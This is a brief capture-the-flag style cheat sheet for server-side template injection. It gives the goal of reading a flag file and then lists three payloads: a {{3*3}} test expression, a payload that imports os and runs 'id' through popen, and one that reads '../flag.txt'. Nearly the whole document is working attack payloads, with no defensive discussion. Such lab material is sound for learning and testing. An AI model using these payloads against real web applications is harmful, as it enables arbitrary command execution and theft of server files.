- __Vulnerability__: Server-side Template Injection
- __Goal__: Read the flag from the system

#### SSTI payloads to read the flag

```python
{{3*3}}
```

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat ../flag.txt').read()}}
```
